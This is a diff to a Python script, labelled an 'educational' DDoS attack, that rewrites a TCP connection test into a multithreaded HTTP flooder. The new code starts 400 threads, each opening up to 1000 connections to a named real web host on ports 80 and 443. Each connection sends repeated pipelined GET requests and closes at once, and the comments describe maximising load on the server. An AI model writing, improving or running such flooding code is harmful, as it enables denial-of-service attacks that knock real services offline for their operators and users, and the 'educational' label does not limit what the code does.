@@ -36,49 +36,56 @@ print("ATAQUE DDOS INICIADO(educacional)")
 time.sleep(3)
 
 
-def testar_conexao_tcp(host, porta, timeout=5):
-        
-    try:
-        # Cria o socket TCP
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(timeout)
+import socket
+import threading
+import random
 
-       # 2. Estabelece a Conexão (Handshake)
-        sock.connect((host, porta))
-  
+# Configurações
+ip = "portal-do-estudante.vercel.app"
+tentativas_por_thread = 1000 # Evita loop infinito travando o PC
 
-        # 3. Envia um pacote de dados (Payload)
-        # Se for porta 80, enviamos um cabeçalho HTTP básico
-        payload = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-        while True:
-            sock.sendall(payload.encode())
-            resposta = sock.recv(1024)
-            if resposta:
-                print(f"[Resposta recebida ({len(resposta)} bytes)")
-
-          
-    except Exception as e:
-        print(f"[EXCEÇÃO] Erro ao conectar: {e}")
-        return False
-
-    finally:
-        sock.close()
-
+def estresse_maximo(host, porta):
+    # Criamos um payload de tamanho variável para forçar o processamento do servidor
+    payload = f"GET /{random.randint(1,1000)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: StressTest\r\n\r\n".encode()
+    
+    for _ in range(tentativas_por_thread):
+        try:
+            # Criar o socket com timeout baixíssimo para não desperdiçar tempo
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5) 
+            
+            sock.connect((host, porta))
+            
+            # Enviar o payload repetidamente na mesma conexão (Pipeline)
+            for _ in range(10): 
+                sock.sendall(payload)
+                
+            # NOTA: Não usamos sock.recv() para não bloquear a thread
+            # O fechamento forçado gera overhead no kernel do servidor
+            sock.close() 
+            
+        except Exception:
+            # Em testes de carga, ignoramos erros para manter a velocidade
+            pass
 
 threads = []
 
-# Criando várias threads
-for i in range(10):  # Exemplo: criando 100 threads
-    th = threading.Thread(target=testar_conexao_tcp, args=(ip, 443)) # Exemplo: testando porta 443
-    t = threading.Thread(target=testar_conexao_tcp, args=(ip, 80))  # Exemplo: testando porta 80
-    threads.append(t)
-    threads.append(th)
-    t.start()  
-    th.start()
+print(f"--- INICIANDO CARGA MÁXIMA EM {ip} ---")
 
-# Esperar todas terminarem
+# Aumentamos o número de threads. 
+# Cuidado: valores muito altos podem travar o SEU computador.
+for i in range(200):  
+    t80 = threading.Thread(target=estresse_maximo, args=(ip, 80))
+    t443 = threading.Thread(target=estresse_maximo, args=(ip, 443))
+    
+    t80.start()
+    t443.start()
+    threads.extend([t80, t443])
+
 for t in threads:
     t.join()
+
+print("--- TESTE FINALIZADO ---")
 
 print("Todas as threads finalizaram")
 
